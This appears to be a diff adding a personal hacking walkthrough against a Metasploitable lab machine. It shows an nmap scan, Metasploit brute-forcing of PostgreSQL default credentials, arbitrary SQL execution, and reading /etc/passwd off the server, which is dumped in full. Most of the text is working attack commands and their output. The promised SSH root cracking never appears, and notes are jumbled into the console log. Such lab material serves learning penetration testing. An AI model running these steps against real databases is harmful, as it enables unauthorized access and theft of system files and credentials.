@@ -1,0 +1,389 @@
+STEPS TO HACK PostgreSQL DATABASE & CRACK SSH ROOT PASSWORD
+===========================================================
+1. NMAP SCAN TARGET
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+****************************************************************1. NMAP SCAN TARGET
+====================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-06 21:38 EDT
+Nmap scan report for 192.168.209.151
+Host is up (0.0019s latency).
+
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+MAC Address: 00:0C:29:DA:D0:D3 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.02 seconds
+
+2. SEARCH FOR TARGETED SERVICE IN YOUR SCAN RESULT
+==================================================
+root@alice:~# nmap -sV -p5432,22 192.168.209.151 > postgresSCAN.txt
+root@alice:~# egrep -i '(5432|22)' postgresSCAN.txt
+22/tcp   open  ssh        OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+5432/tcp open  postgresql PostgreSQL DB 8.3.0 - 8.3.7
+root@alice:~# 
+
+3. START METASPLOIT CONSOLE AND DIVE INTO IT
+============================================
+root@alice:~# msfconsole
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v4.16.54-dev                         ]
++ -- --=[ 1757 exploits - 1006 auxiliary - 306 post       ]
++ -- --=[ 536 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf exploit(multi/handler) > search postgres
+
+Matching Modules
+================
+
+   Name                                                       Disclosure Date  Rank       Description
+   ----                                                       ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/postgres/postgres_readfile                                  normal     PostgreSQL Server Generic Query
+   auxiliary/admin/postgres/postgres_sql                                       normal     PostgreSQL Server Generic Query
+   auxiliary/analyze/jtr_postgres_fast                                         normal     John the Ripper Postgres SQL Password Cracker
+   auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal     PostgreSQL Database Name Command Line Flag Injection
+   auxiliary/scanner/postgres/postgres_hashdump                                normal     Postgres Password Hashdump
+   auxiliary/scanner/postgres/postgres_login                                   normal     PostgreSQL Login Utility
+   auxiliary/scanner/postgres/postgres_schemadump                              normal     Postgres Schema Dump
+   auxiliary/scanner/postgres/postgres_version                                 normal     PostgreSQL Version Probe
+   auxiliary/server/capture/postgresql                                         normal     Authentication Capture: PostgreSQL
+   exploit/linux/postgres/postgres_payload                    2007-06-05       excellent  PostgreSQL for Linux Payload Execution
+   exploit/multi/http/manage_engine_dc_pmp_sqli               2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/multi/postgres/postgres_createlang                 2016-01-01       good       PostgreSQL CREATE LANGUAGE Execution
+   exploit/windows/misc/manageengine_eventlog_analyzer_rce    2015-07-11       manual     ManageEngine EventLog Analyzer Remote Code Execution
+   exploit/windows/postgres/postgres_payload                  2009-04-10       excellent  PostgreSQL for Microsoft Windows Payload Execution
+   post/linux/gather/enum_users_history                                        normal     Linux Gather User History
+
+
+msf exploit(multi/handler) > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(scanner/postgres/postgres_login) > show options
+
+Module options (auxiliary/scanner/postgres/postgres_login):
+
+   Name              Current Setting                                                               Required  Description
+   ----              ---------------                                                               --------  -----------
+   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                     yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
+   PASSWORD                                                                                        no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
+   RHOSTS                                                                                          yes       The target address range or CIDR identifier
+   RPORT             5432                                                                          yes       The target port
+   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                             yes       The number of concurrent threads
+   USERNAME                                                                                        no        A specific username to authenticate as
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                          yes       Whether to print output for all attempts
+
+Suppose you are able to correctly guess the username and password of the PostgreSQL database, but not the database name. 
+msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.209.151
+RHOSTS => 192.168.209.151
+msf auxiliary(scanner/postgres/postgres_login) > run
+[-] 192.168.209.151:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
+[-] 192.168.209.151:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
+[+] 192.168.209.151:5432 - Login Successful: postgres:postgres@template1
+
+
+*** Same results by manually setting the database as template1
+==============================================================
+msf auxiliary(scanner/postgres/postgres_login) > set DATABASE template1
+DATABASE => template1
+msf auxiliary(scanner/postgres/postgres_login) > run
+[+] 192.168.209.151:5432 - Login Successful: postgres:postgres@template1
+
+[-] 192.168.209.151:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/postgres/postgres_login) > USE POSTGRES LOGIN CREDENTIALS TO DO ADMIN STUFF
+
+
+USE POSTGRES LOGIN CREDENTIALS TO DO ADMIN STUFF
+================================================
+================================================.
+msf auxiliary(scanner/postgres/postgres_login) > We are going to run SQL arbitrary statements
+[-] Unknown command: We.
+msf auxiliary(scanner/postgres/postgres_login) > use auxiliary/admin/postgres/postgres_sql
+msf auxiliary(admin/postgres/postgres_sql) > info auxiliary/admin/postgres/postgres_sql
+
+       Name: PostgreSQL Server Generic Query
+     Module: auxiliary/admin/postgres/postgres_sql
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  todb <todb@metasploit.com>
+Basic options:
+  Name           Current Setting   Required  Description
+  ----           ---------------   --------  -----------
+  DATABASE       template1         yes       The database to authenticate against
+  PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
+  RETURN_ROWSET  true              no        Set to true to see query result sets
+  RHOST                            yes       The target address
+  RPORT          5432              yes       The target port
+  SQL            select version()  no        The SQL query to execute
+  USERNAME       postgres          yes       The username to authenticate as
+  VERBOSE        false             no        Enable verbose output
+
+Description:
+  This module will allow for simple SQL statements to be executed 
+  against a PostgreSQL instance given the appropriate credentials.
+
+References:
+  www.postgresql.org
+
+SET REMOTE HOST AND METASPLOITABLE LOGIN CREDENTIALS
+==================================================== 
+msf auxiliary(admin/postgres/postgres_sql) > set RHOST 192.168.209.151
+RHOST => 192.168.209.151
+msf auxiliary(admin/postgres/postgres_sql) > set PASSWORD postgres
+PASSWORD => postgres
+msf auxiliary(admin/postgres/postgres_sql) > 
+
+Postgres is different from MySQL, to list all the databases:
+We can use the pg_database database. 
+The following SQL command gets names of databases from pg_database: 
+===================================================================
+
+msf auxiliary(admin/postgres/postgres_sql) > set SQL show databases
+SQL => show databases
+msf auxiliary(admin/postgres/postgres_sql) > select datname from pg_database;
+
+Query Text: 'select datname from pg_database;'
+==============================================
+
+    datname
+    -------
+    postgres
+    template0
+    template1
+
+msf auxiliary(admin/postgres/postgres_sql) > 
+
+T***HE FOLLOWING COMMAND ALSO WORKS:
+==================================
+
+msf auxiliary(admin/postgres/postgres_sql) > select pg_database.datname from pg_database;
+
+Query Text: 'select pg_database.datname from pg_database;'
+==========================================================
+
+    datname
+    -------
+    postgres
+    template0
+    template1
+
+msf auxiliary(admin/postgres/postgres_sql) > 
+
+OBTAIN /ETC/PASSWD WITH POSTGRESQL
+==================================
+SQL statement to obtain files: select load_file(\'/etc/passwd\')
+
+POSTGRES doesnt use "load_file" it uses "load" as follows: 
+msf auxiliary(admin/postgres/postgres_sql) > set SQL load \'/etc/passwd\'
+SQL => load '/etc/passwd'
+msf auxiliary(admin/postgres/postgres_sql) > exploit
+
+[-] 192.168.209.151:5432 Postgres - CXX000 SQL statement 'load '/etc/passwd'' returns #<RuntimeError: ERROR	CXX000	Mcould not load library "/etc/passwd": /etc/passwd: invalid ELF header	Fdfmgr.c	L240	Rinternal_load_library>
+[*] Auxiliary module execution completed
+msf auxiliary(admin/postgres/postgres_sql) > 
+
+***** No bite, error returned.
+
+LET US USE THE postgres_readfile FOUND IN METASPLOIT:
+====================================================
+msf auxiliary(admin/postgres/postgres_sql) > use auxiliary/admin/postgres/postgres_readfile
+msf auxiliary(admin/postgres/postgres_readfile) > info
+
+       Name: PostgreSQL Server Generic Query
+     Module: auxiliary/admin/postgres/postgres_readfile
+    License: Metasploit Framework License (BSD)
+       Rank: Normal
+
+Provided by:
+  todb <todb@metasploit.com>
+
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  DATABASE  template1        yes       The database to authenticate against
+  PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
+  RFILE     /etc/passwd      yes       The remote file
+  RHOST                      yes       The target address
+  RPORT     5432             yes       The target port
+  USERNAME  postgres         yes       The username to authenticate as
+  VERBOSE   false            no        Enable verbose output
+
+Description:
+  This module imports a file local on the PostgreSQL Server into a 
+  temporary table, reads it, and then drops the temporary table. It 
+  requires PostgreSQL credentials with table CREATE privileges as well 
+  as read privileges to the target file.
+
+msf auxiliary(admin/postgres/postgres_readfile) > set RHOST 192.168.209.151
+RHOST => 192.168.209.151
+msf auxiliary(admin/postgres/postgres_readfile) > set PASSWORD postgres
+PASSWORD => postgres
+msf auxiliary(admin/postgres/postgres_readfile) > set USERNAME postgres
+USERNAME => postgres
+msf auxiliary(admin/postgres/postgres_readfile) > exploit
+
+Query Text: 'CREATE TEMP TABLE nvCANPNkKtDsxd (INPUT TEXT);
+      COPY nvCANPNkKtDsxd FROM '/etc/passwd';
+      SELECT * FROM nvCANPNkKtDsxd'
+=============================================================================================================================================
+
+    input
+    -----
+    backup:x:34:34:backup:/var/backups:/bin/sh
+    bin:x:2:2:bin:/bin:/bin/sh
+    bind:x:105:113::/var/cache/bind:/bin/false
+    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+    dhcp:x:101:102::/nonexistent:/bin/false
+    distccd:x:111:65534::/:/bin/false
+    dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+    ftp:x:107:65534::/home/ftp:/bin/false
+    games:x:5:60:games:/usr/games:/bin/sh
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+    klog:x:103:104::/home/klog:/bin/false
+    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+    mail:x:8:8:mail:/var/mail:/bin/sh
+    man:x:6:12:man:/var/cache/man:/bin/sh
+    msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+    mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+    news:x:9:9:news:/var/spool/news:/bin/sh
+    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+    postfix:x:106:115::/var/spool/postfix:/bin/false
+    postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+    proftpd:x:113:65534::/var/run/proftpd:/bin/false
+    proxy:x:13:13:proxy:/bin:/bin/sh
+    root:x:0:0:root:/root:/bin/bash
+    service:x:1002:1002:,,,:/home/service:/bin/bash
+    sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+    statd:x:114:65534::/var/lib/nfs:/bin/false
+    sync:x:4:65534:sync:/bin:/bin/sync
+    sys:x:3:3:sys:/dev:/bin/sh
+    syslog:x:102:103::/home/syslog:/bin/false
+    telnetd:x:112:120::/nonexistent:/bin/false
+    tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+    user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+dhcp:x:101:102::/nonexistent:/bin/false
+syslog:x:102:103::/home/syslog:/bin/false
+klog:x:103:104::/home/klog:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+bind:x:105:113::/var/cache/bind:/bin/false
+postfix:x:106:115::/var/spool/postfix:/bin/false
+ftp:x:107:65534::/home/ftp:/bin/false
+postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
+tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
+distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+dojodone:x:1003:1003:noondi:/home/dojodone:/bin/bash
+[+] 192.168.209.151:5432 Postgres - /etc/passwd saved in /root/.msf4/loot/20180507010226_default_192.168.209.151_postgres.file_248511.txt
+[*] Auxiliary module execution completed
+msf auxiliary(admin/postgres/postgres_readfile) > 
+
+
+====COMMANDS USED ==========
+============================
+459  search postgres
+460  use auxiliary/scanner/postgres/postgres_login
+461  show options
+462  set RHOSTS 192.168.209.151
+463  run
+464  set DATABASE template1
+465  run
+466  USE POSTGRES LOGIN CREDENTIALS TO DO ADMIN STUFF
+467  ================================================
+468  We are going to run SQL arbitrary statements
+469  use auxiliary/admin/postgres/postgres_sql
+470  info auxiliary/admin/postgres/postgres_sql
+471  set RHOST 192.168.209.151
+472  set PASSWORD postgres
+473  set SQL show databases
+474  select datname from pg_database;
+475  select pg_database.datname from pg_database;
+476  set SQL load \'/etc/passwd\'
+477  exploit
+478  use auxiliary/admin/postgres/postgres_readfile
+479  info
+480  set RHOST 192.168.209.151
+481  set PASSWORD postgres
+482  set USERNAME postgres
+483  exploit
+484  history 
+msf auxiliary(admin/postgres/postgres_readfile) > 
+
